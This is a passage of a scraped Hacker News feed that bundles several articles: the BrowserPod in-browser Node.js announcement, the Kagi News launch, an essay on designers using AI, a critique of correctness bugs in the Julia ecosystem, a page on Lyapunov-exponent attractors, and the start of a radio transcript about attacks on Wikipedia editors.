    &lt;p&gt;BrowserPod is designed to run complete development environments in the browser, without installing local helper applications or dedicated server-side resources.&lt;/p&gt;
    &lt;p&gt;A typical use case of BrowserPod, exemplified by this demo, would be a browser-based IDE that can run a preview server, for example via &lt;code&gt;npm run dev&lt;/code&gt;. The preview server runs fully in the browser, with each update to files being reflected in the virtualized environment. As files are updated the normal Hot Module Replacement triggers, updating the preview.&lt;/p&gt;
    &lt;p&gt;The application preview is not just available in the same browser session, but is exposed to the internet via a Portal, a seamless solution to allow direct public access to any HTTP service running inside a Pod.&lt;/p&gt;
    &lt;p&gt;Portals make it possible to achieve real cross-device testing of applications and even pre-release sharing of test URLs with external users, including early adopters, stakeholders and clients.&lt;/p&gt;
    &lt;p&gt;BrowserPod’s initial focus will be on Node.js environments, which are supported via a complete build of Node.js, compiled to WebAssembly and virtualized in the browser. BrowserPod will support multiple versioned runtimes, with Node.js 22 being included in the first release.&lt;/p&gt;
    &lt;p&gt;This high-fidelity approach ensures that applications developed in BrowserPod containers will behave the same when migrated to production, making it possible to build real-world applications in Pods, not just prototypes.&lt;/p&gt;
    &lt;p&gt;BrowserPod is a great fit for web-based IDEs, educational environments, interactive documentation websites and AI coding Agents.&lt;/p&gt;
    &lt;head rend="h2"&gt;How does BrowserPod work?&lt;/head&gt;
    &lt;p&gt;BrowserPod builds on our years long experience in delivering high performance in-browser virtualization via WebVM. WebVM is powered by CheerpX, our x86-to-WebAssembly virtualization engine, and it has been the most popular tool we have released so far, with 15k+ stars on GitHub.&lt;/p&gt;
    &lt;p&gt;To make BrowserPod possible we have rearchitectured CheerpX to separate its two main components: the x86-to-WebAssembly JIT compiler engine, and the Linux system call emulation layer. This emulation layer, that we are calling CheerpOS internally, is now shared across CheerpX and BrowserPod and, down the line, it will become a foundation layer across all our products.&lt;/p&gt;
    &lt;p&gt;CheerpOS is effectively a WebAssembly kernel that allows unmodified C/C++ code for Linux to run in the browser. In the context of BrowserPod it is used to provide a unified view of filesystem and access to networking across the multiple processes running in a Pod.&lt;/p&gt;
    &lt;p&gt;On top of this kernel layer, we compile the C++ source code of Node.js, with minimal changes, to a combination of WebAssembly and JavaScript. The use of JavaScript is specific to Node.js and provides the required shortcut to run JavaScript payloads natively in the browser itself, which is critical for high performance execution of Node.js environments.&lt;/p&gt;
    &lt;p&gt;Other stacks, such as Python and Ruby on Rails, will instead run as pure WebAssembly applications on top of the CheerpOS kernel.&lt;/p&gt;
    &lt;head rend="h2"&gt;Licensing&lt;/head&gt;
    &lt;p&gt;BrowserPod will come with a generous free license with attribution, available for non-commercial users and technical evaluations.&lt;/p&gt;
    &lt;p&gt;A transparent pay-as-you-go model will be available for any use and purpose, including companies working on AI codegen tools. Pricing will be announced at release time and it will be very affordable to maximize the adoption of this technology, with discounts available for educational and non-profit use.&lt;/p&gt;
    &lt;p&gt;An Enterprise license will also be available for self-hosting and commercial support.&lt;/p&gt;
    &lt;head rend="h2"&gt;General Availability&lt;/head&gt;
    &lt;p&gt;The initial release of BrowserPod will become generally available in late November - early December 2025, with support for Node.js 22.&lt;/p&gt;
    &lt;p&gt;Over the course of the following year, we have planned several additional releases, including support for multiple Node.js versions, support for Python and Ruby on Rails, and eventually support for React Native environments.&lt;/p&gt;
    &lt;p&gt;To receive up-to-date information on BrowserPod, make sure to register on our website. We plan to extend an early adopter program to a selected subset of registered users and organizations.&lt;/p&gt;
    &lt;p&gt;For more information on all our products and technologies, please join our Discord. Most members of the development team are active there and ready to answer any question you might have. You can also follow us on X and LinkedIn for updates.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusions&lt;/head&gt;
    &lt;p&gt;BrowserPod is currently in the final stages of development, and we are thrilled to see what the community will build on top of this technology when it is released in late November.&lt;/p&gt;
    &lt;p&gt;Leaning Technologies mission statement is “Run anything on the browser”, and BrowserPod is an important milestone along this journey. It will also not be the last and we have great ambitions for our ecosystem as we migrate to the unified CheerpOS foundational layer. Stay tuned!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://labs.leaningtech.com/blog/browserpod-annoucement"/><published>2025-09-30T14:42:18+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45426205</id><title>How the AI bubble ate Y Combinator</title><updated>2025-09-30T16:43:04.749811+00:00</updated><content/><link href="https://www.inc.com/sam-blum/how-the-ai-bubble-ate-y-combinator/91240632"/><published>2025-09-30T14:52:29+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45426490</id><title>Kagi News</title><updated>2025-09-30T16:43:04.526909+00:00</updated><content>&lt;doc fingerprint="b500b3a787eb238f"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Introducing Kagi News&lt;/head&gt;
    &lt;p&gt;A comprehensive daily press review with global news. Fully private, with sources openly curated by our community.&lt;/p&gt;
    &lt;p&gt;News is broken. We all know it, but we’ve somehow accepted it as inevitable. The endless notifications. The clickbait headlines designed to trigger rather than inform, driven by relentless ad monetization. The exhausting cycle of checking multiple apps throughout the day, only to feel more anxious and less informed than when we started. This isn’t what news was supposed to be. We can do better, and create what news should have been all along: pure, essential information that respects your intelligence and time.&lt;/p&gt;
    &lt;head rend="h2"&gt;Our approach: Signal over noise&lt;/head&gt;
    &lt;p&gt;Kagi News operates on a simple principle: understanding the world requires hearing from the world. Every day, our system reads thousands of community curated RSS feeds from publications across different viewpoints and perspectives. We then distill this massive information into one comprehensive daily briefing, while clearly citing sources.&lt;/p&gt;
    &lt;p&gt;We strive for diversity and transparency of resources and welcome your contributions to widen perspectives. This multi-source approach helps reveal the full picture beyond any single viewpoint.&lt;/p&gt;
    &lt;head rend="h2"&gt;Design principles that put readers first&lt;/head&gt;
    &lt;p&gt;One daily update: We publish once per day around noon UTC, creating a natural endpoint to news consumption. This is a deliberate design choice that turns news from an endless habit into a contained ritual.&lt;/p&gt;
    &lt;p&gt;Five-minute complete understanding: Our briefings cover everything important in just five minutes. No endless scrolling. No attention hijacking. You read, understand, and move on with your day.&lt;/p&gt;
    &lt;p&gt;Diversity over echo chambers: Rather than personalizing feeds to match existing preferences, we expose readers to the full spectrum of global perspectives. This approach breaks down information silos instead of reinforcing them.&lt;/p&gt;
    &lt;p&gt;Privacy by design: Your reading habits belong to you. We don’t track, profile, or monetize your attention. You remain the customer and not the product.&lt;/p&gt;
    &lt;p&gt;Community-driven sources: Our news sources are open source and community-curated through our public GitHub repository. Anyone can propose additions, flag problems, or suggest improvements.&lt;/p&gt;
    &lt;p&gt;Customizable: In your settings, you can select and reorder categories to match your interests and priorities. You can also adjust the number of stories shown, as well as dragging to re-order various sections, so that your briefing is focused on the depth and topics that matter most to you.&lt;/p&gt;
    &lt;p&gt;News in your language: You can choose your preferred interface and content language. News stories are generated in their original source language, and then translated using Kagi Translate. The default mode shows regional stories in their original language without translation, and all other ones in your browser’s language.&lt;/p&gt;
    &lt;head rend="h2"&gt;Technical implementation that respects publishers&lt;/head&gt;
    &lt;p&gt;We don’t scrape content from websites. Instead, we use publicly available RSS feeds that publishers choose to provide. Publishers decide what content appears in their feeds; some include full articles, others only titles or summaries. We respect those choices completely. We’re working within the ecosystem publishers have created rather than circumventing their intentions.&lt;/p&gt;
    &lt;head rend="h2"&gt;Ready to experience news differently?&lt;/head&gt;
    &lt;p&gt;If you’re tired of news that makes you feel worse about the world while teaching you less about it, we invite you to try a different approach with Kagi News, so download it today:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://blog.kagi.com/kagi-news"/><published>2025-09-30T15:09:00+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45426673</id><title>AI will happily design the wrong thing for you</title><updated>2025-09-30T16:43:04.358637+00:00</updated><content>&lt;doc fingerprint="21de58151a65acb0"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;AI will happily design the wrong thing for you&lt;/head&gt;
    &lt;p&gt;I need to clear something up about my book, “Products People Actually Want.” When I write about how “anyone can build anything” now, some people assume I’m anti-AI. That I think these tools are ruining design or product development.&lt;/p&gt;
    &lt;p&gt;That’s not it at all.&lt;/p&gt;
    &lt;p&gt;AI tools are incredible leverage. They make me think faster, broader, and help me produce better work. But like any creative partner or colleague, this doesn’t happen out of the gate. I’ve spent hours—days—training my AI on how we write at Summer Health so the tone is right. I’ve taught it our business model. I tweak its suggestions to better match the experience we want to build.&lt;/p&gt;
    &lt;p&gt;The problem isn’t that AI exists. The problem is how most people use it.&lt;/p&gt;
    &lt;head rend="h2"&gt;The real issue with “anyone can build anything”&lt;/head&gt;
    &lt;p&gt;My book focuses on a specific problem: people building things without knowing if anyone actually needs them. When the barrier to building drops to zero, we get flooded with products that work fine but solve problems that don’t exist.&lt;/p&gt;
    &lt;p&gt;But there’s a second issue too. While AI can help you get started quickly, it won’t build something ready for mass market. Users’ expectations for polish and detail are much higher than what AI produces by default. You can spot AI-generated work from a mile away because it lacks the intentional decisions that make products feel right.&lt;/p&gt;
    &lt;p&gt;The combination is brutal: people building the wrong things, and building them poorly.&lt;/p&gt;
    &lt;p&gt;Just last week, we saw a perfect example. Food influencer Molly Baz discovered that Shopify was selling a website template featuring what she called “a sicko AI version of me.” The image—a woman in a red sweatshirt eating an onion ring in a butter-yellow kitchen—looked almost identical to her cookbook cover.&lt;/p&gt;
    &lt;p&gt;This isn’t really an AI problem, it’s a laziness problem that AI makes more tempting. What used to be someone using an image without permission now gets dressed up as “AI-generated content.” The ironic part? Creating something unique with AI tools is actually easier than trying to replicate someone else’s work. The tools are there. The capability is there. The only thing missing is the intention to actually create something new.&lt;/p&gt;
    &lt;head rend="h2"&gt;How I actually use AI&lt;/head&gt;
    &lt;p&gt;I use AI tools extensively, but strategically:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Granola for transcribing user research sessions&lt;/item&gt;
      &lt;item&gt;Visual Electric for images that are impossible to find in stock libraries (like families that aren’t white middle class)&lt;/item&gt;
      &lt;item&gt;ChatGPT as a sparring partner and for writing better copy&lt;/item&gt;
      &lt;item&gt;Cursor for building websites and prototypes&lt;/item&gt;
      &lt;item&gt;A custom copywriter agent trained on our brand voice&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;But here’s what I don’t do: I don’t use AI to replace thinking. I saw a tool recently that listens to user interviews and suggests follow-up questions. Tools like this make designers lazier, not better. You need genuine curiosity. You need to understand what you’re looking for before you can synthesize anything meaningful.&lt;/p&gt;
    &lt;p&gt;What AI is great at is helping you process large sets of information and pull out themes. But if you don’t understand your users and what they’re struggling with first, it’s impossible to prompt any AI tool for a real solution.&lt;/p&gt;
    &lt;p&gt;Here’s the thing about AI tools: if you don’t know what your customers want, if you as a designer don’t have a view on how to package it, AI will happily make all of that up for you. That just doesn’t mean it’s the right thing. AI fills in the blanks confidently, but those blanks are exactly where the real design work should happen.&lt;/p&gt;
    &lt;head rend="h2"&gt;The skills that actually matter&lt;/head&gt;
    &lt;p&gt;The divide for engineers is easier to see: tools can help them code much faster, but it’s worthless if they can’t understand the generated code.&lt;/p&gt;
    &lt;p&gt;For designers, the key skill going forward will be taste and curation. Understanding what you want to prompt before diving in. Knowing good work from generic work. Being able to refine and iterate until something feels intentional rather than automated.&lt;/p&gt;
    &lt;p&gt;I think designers who resist AI entirely will find themselves without jobs in the next five years. When you can use AI to speed up tedious tasks, what’s the reason for doing them manually?&lt;/p&gt;
    &lt;p&gt;But designers who treat AI like a magic button will struggle too. The ones who thrive will use AI as leverage—to think better, work faster, and explore more possibilities than they could alone.&lt;/p&gt;
    &lt;head rend="h2"&gt;AI amplifies everything&lt;/head&gt;
    &lt;p&gt;Here’s how I see it: AI is leverage. It amplifies whatever you bring to it.&lt;/p&gt;
    &lt;p&gt;If you understand your users deeply, AI helps you explore more solutions. If you have good taste, AI helps you iterate faster. If you can communicate clearly, AI helps you refine that communication.&lt;/p&gt;
    &lt;p&gt;But if you don’t understand the problem you’re solving, AI just helps you build the wrong thing more efficiently. If you have poor judgment, AI amplifies that too.&lt;/p&gt;
    &lt;p&gt;The future belongs to people who combine human insight with AI capability. Not people who think they can skip the human part.&lt;/p&gt;
    &lt;p&gt;My book isn’t the antidote to AI. It’s about developing the judgment to use any tool—AI included—in service of building things people actually want. The better you understand users and business fundamentals, the better your AI-assisted work becomes.&lt;/p&gt;
    &lt;p&gt;AI didn’t create the problem of people building useless products. It just made it easier to build more of them, faster. The solution isn’t to avoid the tools. It’s to get better at the human parts of the job that the tools can’t do for you.&lt;/p&gt;
    &lt;p&gt;Yet.&lt;/p&gt;
    &lt;p&gt;My book Products People Actually Want is out now.&lt;/p&gt;
    &lt;head rend="h2"&gt;Did you enjoy this article?&lt;/head&gt;
    &lt;p&gt;Join 3,000+ designers, developers, and product people who get my best ideas about design each month.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.antonsten.com/articles/ai-will-happily-design-the-wrong-thing-for-you/"/><published>2025-09-30T15:20:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45427021</id><title>Correctness and composability bugs in the Julia ecosystem (2022)</title><updated>2025-09-30T16:43:04.189167+00:00</updated><content>&lt;doc fingerprint="3cc1939b22f38bfe"&gt;
  &lt;main&gt;&lt;p&gt;For many years I used the Julia programming language for transforming, cleaning, analyzing, and visualizing data, doing statistics, and performing simulations.&lt;/p&gt;&lt;p&gt;I published a handful of open-source packages for things like signed distance fields, nearest-neighbor search, and Turing patterns (among others), made visual explanations of Julia concepts like broadcasting and arrays, and used Julia to make the generative art on my business cards.&lt;/p&gt;&lt;p&gt;I stopped using Julia a while ago, but it still sometimes comes up. When people ask, I tell them that I can no longer recommend it. I thought I’d write up my reasons why.&lt;/p&gt;&lt;p&gt;My conclusion after using Julia for many years is that there are too many correctness and composability bugs throughout the ecosystem to justify using it in just about any context where correctness matters.&lt;/p&gt;&lt;p&gt;In my experience, Julia and its packages have the highest rate of serious correctness bugs of any programming system I’ve used, and I started programming with Visual Basic 6 in the mid-2000s.&lt;/p&gt;&lt;p&gt;It might be useful to give some concrete examples.&lt;/p&gt;&lt;p&gt;Here are some correctness issues I filed:&lt;/p&gt;&lt;p&gt;Here are comparable issues filed by others:&lt;/p&gt;&lt;code&gt;copyto!&lt;/code&gt; methods don’t check for aliasing&lt;p&gt;I would hit bugs of this severity often enough to make me question the correctness of any moderately complex computation in Julia.&lt;/p&gt;&lt;p&gt;This was particularly true when trying a novel combination of packages or functions — composing together functionality from multiple sources was a significant source of bugs.&lt;/p&gt;&lt;p&gt;Sometimes the problems would be with packages that don’t compose together, and other times an unexpected combination of Julia’s features within a single package would unexpectedly fail.&lt;/p&gt;&lt;p&gt;For example, I found that the Euclidean distance from the Distances package does not work with Unitful vectors. Others discovered that Julia’s function to run external commands doesn’t work with substrings. Still others found that Julia’s support for missing values breaks matrix multiplication in some cases. And that the standard library’s &lt;code&gt;@distributed&lt;/code&gt; macro didn’t work with OffsetArrays.&lt;/p&gt;&lt;p&gt;OffsetArrays in particular proved to be a strong source of correctness bugs. The package provides an array type that leverages Julia’s flexible custom indices feature to create arrays whose indices don’t have to start at zero or one.&lt;/p&gt;&lt;p&gt;Using them would often result in out-of-bounds memory accesses, just like those one might encounter in C or C++. This would lead to segfaults if you were lucky, or, if you weren’t, to results that were quietly wrong. I once found a bug in core Julia that could lead to out-of-bounds memory accesses even when both the user and library authors wrote correct code.&lt;/p&gt;&lt;p&gt;I filed a number of indexing-related issues with the JuliaStats organization, which stewards statistics packages like Distributions, which 945 packages depend on, and StatsBase, which 1,660 packages depend on. Here are some of them:&lt;/p&gt;&lt;p&gt;The majority of sampling methods are unsafe and incorrect in the presence of offset axes&lt;/p&gt;&lt;p&gt;Fitting a DiscreteUniform distribution can silently return an incorrect answer&lt;/p&gt;&lt;p&gt;Incorrect uses of @inbounds cause miscalculation of statistics&lt;/p&gt;&lt;p&gt;Showing a Weights vector wrapping an offset array accesses out-of-bounds memory&lt;/p&gt;&lt;p&gt;The root cause behind these issues was not the indexing alone but its use together with another Julia feature, &lt;code&gt;@inbounds&lt;/code&gt;, which permits Julia to remove bounds checks from array accesses.&lt;/p&gt;&lt;p&gt;For example:&lt;/p&gt;&lt;code&gt;function sum(A::AbstractArray)
    r = zero(eltype(A))
    for i in 1:length(A)
        @inbounds r += A[i] # ← 🌶
    end
    return r
end
&lt;/code&gt;

&lt;p&gt;The code above iterates &lt;code&gt;i&lt;/code&gt; from 1 to the length of the array. If you pass it an array with an unusual index range, it will access out-of-bounds memory: the array access was annotated with &lt;code&gt;@inbounds&lt;/code&gt;, which removed the bounds check.&lt;/p&gt;&lt;p&gt;The example above shows how to use &lt;code&gt;@inbounds&lt;/code&gt; incorrectly. However, for years it was also the official example of how to use &lt;code&gt;@inbounds&lt;/code&gt; correctly. The example was situated directly above a warning explaining why it was incorrect:&lt;/p&gt;&lt;p&gt;That issue is now fixed, but it is worrying that &lt;code&gt;@inbounds&lt;/code&gt; can be so easily misused, causing silent data corruption and incorrect mathematical results.&lt;/p&gt;&lt;p&gt;In my experience, issues like these were not confined to the mathematical parts of the Julia ecosystem.&lt;/p&gt;&lt;p&gt;I encountered library bugs while trying to accomplish mundane tasks like encoding JSON, issuing HTTP requests, using Arrow files together with DataFrames, and editing Julia code with Pluto, Julia’s reactive notebook environment.&lt;/p&gt;&lt;p&gt;When I became curious if my experience was representative, a number of Julia users privately shared similar stories. Recently, public accounts of comparable experiences have begun to surface.&lt;/p&gt;&lt;p&gt;For example, in this post Patrick Kidger describes his attempt to use Julia for machine learning research:&lt;/p&gt;&lt;quote&gt;&lt;p&gt;It’s pretty common to see posts on the Julia Discourse saying “XYZ library doesn’t work”, followed by a reply from one of the library maintainers stating something like “This is an upstream bug in the new version a.b.c of the ABC library, which XYZ depends upon. We’ll get a fix pushed ASAP.”&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Here’s Patrick’s experience tracking down a correctness bug (emphasis mine):&lt;/p&gt;&lt;quote&gt;&lt;p&gt;I remember all too un-fondly a time in which one of my Julia models was failing to train. I spent multiple months on-and-off trying to get it working, trying every trick I could think of.&lt;/p&gt;&lt;p&gt;Eventually – eventually! – I found the error: Julia/Flux/Zygote was returning incorrect gradients. After having spent so much energy wrestling with points 1 and 2 above, this was the point where I simply gave up. Two hours of development work later, I had the model successfully training… in PyTorch.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;In a discussion about the post others responded that they, too, had similar experiences.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Like @patrick-kidger, I have been bit by incorrect gradient bugs in Zygote/ReverseDiff.jl. This cost me weeks of my life and has thoroughly shaken my confidence in the entire Julia AD landscape. [...] In all my years of working with PyTorch/TF/JAX I have not once encountered an incorrect gradient bug.&lt;/p&gt;&lt;/quote&gt;&lt;quote&gt;&lt;p&gt;Since I started working with Julia, I’ve had two bugs with Zygote which have slowed my work by several months. On a positive note, this has forced me to plunge into the code and learn a lot about the libraries I’m using. But I’m finding myself in a situation where this is becoming too much, and I need to spend a lot of time debugging code instead of doing climate research.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Given Julia’s extreme generality it is not obvious to me that the correctness problems can be solved. Julia has no formal notion of interfaces, generic functions tend to leave their semantics unspecified in edge cases, and the nature of many common implicit interfaces has not been made precise (for example, there is no agreement in the Julia community on what a number is).&lt;/p&gt;&lt;p&gt;The Julia community is full of capable and talented people who are generous with their time, work, and expertise. But systemic problems like this can rarely be solved from the bottom up, and my sense is that the project leadership does not agree that there is a serious correctness problem. They accept the existence of individual isolated issues, but not the pattern that those issues imply.&lt;/p&gt;&lt;p&gt;At a time when Julia’s machine learning ecosystem was even less mature, for example, a co-founder of the language spoke enthusiastically about using Julia in production for self-driving cars:&lt;/p&gt;&lt;p&gt;And while it’s possible that attitudes have shifted since I was an active member, the following quote from another co-founder, also made around the same time, serves as a good illustration of the perception gap (emphasis mine):&lt;/p&gt;&lt;quote&gt;&lt;p&gt;I think the top-level take away here is not that Julia is a great language (although it is) and that they should use it for all the things (although that’s not the worst idea), but that its design has hit on something that has made a major step forwards in terms of our ability to achieve code reuse. It is actually the case in Julia that you can take generic algorithms that were written by one person and custom types that were written by other people and just use them together efficiently and effectively. This majorly raises the table stakes for code reuse in programming languages. Language designers should not copy all the features of Julia, but they should at the very least understand why this works so well, and be able to accomplish this level of code reuse in future designs.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Whenever a post critiquing Julia makes the rounds, people from the community are often quick to respond that, while there have historically been some legitimate issues, things have improved substantially and most of the issues are now fixed.&lt;/p&gt;&lt;p&gt;For example:&lt;/p&gt;&lt;p&gt;These responses often look reasonable in their narrow contexts, but the net effect is that people’s legitimate experiences feel diminished or downplayed, and the deeper issues go unacknowledged and unaddressed.&lt;/p&gt;&lt;p&gt;My experience with the language and community over the past ten years strongly suggests that, at least in terms of basic correctness, Julia is not currently reliable or on the path to becoming reliable. For the majority of use cases the Julia team wants to service, the risks are simply not worth the rewards.&lt;/p&gt;&lt;p&gt;Ten years ago, Julia was introduced to the world with an inspiring and ambitious set of goals. I still believe that they can, one day, be achieved—but not without revisiting and revising the patterns that brought the project to the state it is in today.&lt;/p&gt;&lt;p&gt;Thanks to Mitha Nandagopalan, Ben Cartwright-Cox, Imran Qureshi, Dan Luu, Elad Bogomolny, Zora Killpack, Ben Kuhn, and Yuriy Rusko for discussions and comments on earlier drafts of this post.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://yuri.is/not-julia/"/><published>2025-09-30T15:46:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45427059</id><title>Visualizations of Random Attractors Found Using Lyapunov Exponents</title><updated>2025-09-30T16:43:04.025067+00:00</updated><content>&lt;doc fingerprint="2992588605812842"&gt;
  &lt;main&gt;
    &lt;cell&gt;&lt;head rend="h1"&gt; Random Attractors&lt;lb/&gt; Found using Lyapunov Exponents &lt;/head&gt; Written by Paul Bourke&lt;lb/&gt; October 2001&lt;p&gt; Contribution by Philip Ham: attractor.basic&lt;lb/&gt; and Python implementation by Johan Bichel Lindegaard.&lt;/p&gt;&lt;p&gt; This document is "littered" with a selection of attractors found using the techniques described. &lt;/p&gt;&lt;p&gt; In order for a system to exhibit chaotic behaviour it must be non linear. Representing chaotic systems on a screen or on paper leads one to considering a two dimensional system, an equation in two variables. One possible two dimensional non-linear system, the one used here, is the quadratic map defined as follows. &lt;/p&gt; xn+1 = a0 + a1 xn + a2 xn2 + a3 xn yn + a4 yn + a5 yn2 &lt;lb/&gt; yn+1 = b0 + b1 xn + b2 xn2 + b3 xn yn + b4 yn + b5 yn2 &lt;p&gt; The standard measure for determining whether or not a system is chaotic is the Lyapunov exponent, normally represented by the lambda symbol. Consider two close points at step n, xn and xn+dxn. At the next time step they will have diverged, namely to xn+1 and xn+1+dxn+1. It is this average rate of divergence (or convergence) that the Lyapunov exponent captures. Another way to think about the Lyapunov exponent is as the rate at which information about the initial conditions is lost. &lt;/p&gt;&lt;p&gt; There are as many Lyapunov exponents as dimensions of the phase space. Considering a region (circle, sphere, hypersphere, etc) in phase space then at a later time all trajectories in this region form an n-dimensional elliptical region. The Lyapunov exponent can be calculated for each dimension. When talking about a single exponent one is normally referring to the largest, this convention will be assumed from now onwards. &lt;/p&gt;&lt;p&gt; If the Lyapunov exponent is positive then the system is chaotic and unstable. Nearby points will diverge irrespective of how close they are. Although there is no order the system is still deterministic! The magnitude of the Lyapunov exponent is a measure of the sensitivity to initial conditions, the primary characteristic of a chaotic system. &lt;/p&gt;&lt;p&gt; If the Lyapunov exponent is less than zero then the system attracts to a fixed point or stable periodic orbit. These systems are non conservative (dissipative). The absolute value of the exponent indicates the degree of stability. &lt;/p&gt;&lt;p&gt; If the Lyapunov exponent is zero then the system is neutrally stable, such systems are conservative and in a steady state mode. &lt;/p&gt;&lt;p&gt; To create the chaotic attractors shown on this page each parameter an and bn in the quadratic equation above is chosen at random between some bounds (+- 2 say). The system so specified is generated by iterating for some suitably large number of time steps (eg; 100000) steps during which time the image is created and the Lyapunov exponent computed. Note that the first few (1000) timesteps are ignored to allow the system to settle into its "natural" behaviour. If the Lyapunov exponent indicates chaos then the image is saved and the program moves on to the next random parameter set. &lt;/p&gt;&lt;p&gt; There are a number of ways the series may behave. &lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt; It may converge to a single point, called a fixed point. These can be detected by comparing the distances between successive points. For numerical reasons this is safer than relying on the Lyapunov exponent which may be infinite (logarithm of 0)&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt; It may diverge to infinity, for the range (+- 2) used here for each parameter this is the most likely event. These are also easy to detect and discard, indeed they need to be in order to avoid numerical errors.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt; It will form a periodic orbit, these are identified by their negative Lyapunov exponent. &lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt; It will exhibit chaos, filling in some region of the plane. These are the solutions that "look good" and the ones we wish to identify with the Lyapunov exponent. &lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;p&gt; It should be noted that there may be visually appealing structures that are not chaotic attractors. That is, the resulting image is different for different initial conditions and there is no single basin of attraction. It's interesting how we "see" 3 dimensional structures in these essentially 2 dimensional systems. &lt;/p&gt;&lt;p&gt; The software used to create these images is given here: gen.c. On average 98% of the random selections of (an, bn) result in an infinite series. This is so common because of the range (-2 &amp;lt;= a,b &amp;lt;= 2) for each of the parameters a and b, the number of infinite cases will reduce greatly with a smaller range. About 1% were point attractors, and about 0.5% were periodic basins of attraction. &lt;/p&gt;&lt;table&gt;&lt;row&gt;&lt;cell&gt;&lt;p&gt; Image courtesy of Robert McGregor, Space Coast of Florida. Launch trail perhaps 30 minutes after the shuttle launch (June 2007) dispersing from a column into a smoke ring due to some unusual air currents in the upper atmosphere. &lt;/p&gt;&lt;/cell&gt;&lt;/row&gt;&lt;/table&gt;&lt;p&gt; References&lt;/p&gt;&lt;p&gt; Berge, P., Pomeau, Y., Vidal, C.,&lt;lb/&gt; Order Within Chaos, Wiley, New York, 1984. &lt;/p&gt;&lt;p&gt; Crutchfield, J., Farmer, J., Packard, N.&lt;lb/&gt; Chaos, Scientific American, 1986, 255, 46-47 &lt;/p&gt;&lt;p&gt; Das, A., Das, Pritha, Roy, A&lt;lb/&gt; Applicability of Lyapunov Exponent in EEG data analysis. Complexity International, draft manuscript. &lt;/p&gt;&lt;p&gt; Devaney, R.&lt;lb/&gt; An Introduction to Chaotic Dynamical Systems, Addison-Wesley, 1989 &lt;/p&gt;&lt;p&gt; Feigenbaum, M.,&lt;lb/&gt; Universal behaviour in Nonlinear Systems, Los Alamos Science, 1981 &lt;/p&gt;&lt;p&gt; Peitgen, H., Jurgens, H., Saupe, D&lt;lb/&gt; Lyapunov exponents and chaotic attractors in Chaos and fractals - new frontiers of science. Springer, new York, 1992. &lt;/p&gt;&lt;p&gt; Contributions by Dmytry Lavrov &lt;/p&gt;&lt;/cell&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://paulbourke.net/fractals/lyapunov/"/><published>2025-09-30T15:50:14+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45427474</id><title>The right wing is coming for Wikipedia</title><updated>2025-09-30T16:43:03.605297+00:00</updated><content>&lt;doc fingerprint="7e1f0a1328a2c893"&gt;
  &lt;main&gt;
    &lt;p&gt;Support WBUR&lt;/p&gt;
    &lt;head rend="h1"&gt;The right wing is coming for Wikipedia&lt;/head&gt;
    &lt;p&gt;The Heritage Foundation says it will "identify and target" Wikipedia editors over alleged bias. What does that mean for Wikipedia’s future?&lt;/p&gt;
    &lt;head rend="h3"&gt;Guests&lt;/head&gt;
    &lt;p&gt;Molly White, Wikipedia editor for around 20 years. Independent writer.&lt;/p&gt;
    &lt;p&gt;Stephen Harrison, freelance journalist who’s been writing about Wikipedia for 8 years. Tech lawyer. Author of the novel The Editors.&lt;/p&gt;
    &lt;head rend="h3"&gt;Also Featured&lt;/head&gt;
    &lt;p&gt;Rachel Goodman, special counsel and team manager for Free Expression and the Right to Dissent at Protect Democracy.&lt;/p&gt;
    &lt;head rend="h3"&gt;Transcript&lt;/head&gt;
    &lt;p&gt;Part I&lt;/p&gt;
    &lt;p&gt;MEGHNA CHAKRABARTI: Roughly a week ago, on September 11, the day after Charlie Kirk was fatally shot, Wikipedia users noticed something new on the page for his widow Erika Kirk. At the top of the page was a gray box with a red stripe.&lt;/p&gt;
    &lt;p&gt;ANTHONY PETERZZZ: Okay, so I'm going to show you something really strange about Erika Kirk's Wikipedia page. It has been nominated for deletion. That's fricking disturbing. That's really disturbing.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: A Wikipedia editor with the username, 'E pluribus unum, y'all' was recommending Erika Kirk's page be deleted. The editor wrote, "Article was created in the aftermath of Charlie Kirk's killing yesterday, but coverage otherwise is either limited in nature (i.e. her participation in beauty pageants) or inherited from her husband."&lt;/p&gt;
    &lt;p&gt;NICOLE APPROVES: This is on Fox News, Wikipedia debates deleting the profile page of Charlie Kirk's wife Erika. Editors are split on whether Charlie Kirk's widow has enough independent coverage to warrant entry, the liberal attempts to basically erase conservatives. You're all pathetic.&lt;/p&gt;
    &lt;p&gt;Support WBUR&lt;/p&gt;
    &lt;p&gt;JESSE ON FIRE: Why would they do that, if she's not notorious enough? Why are you even worried about it? And everyone knows who she is. You just don't like her. Okay? You are reprehensible, disgusting, evil people who are trying to cancel her and get rid of her because you are leftist.&lt;/p&gt;
    &lt;p&gt;CHAKRABARTI: Stephen Harrison joins us now.&lt;/p&gt;
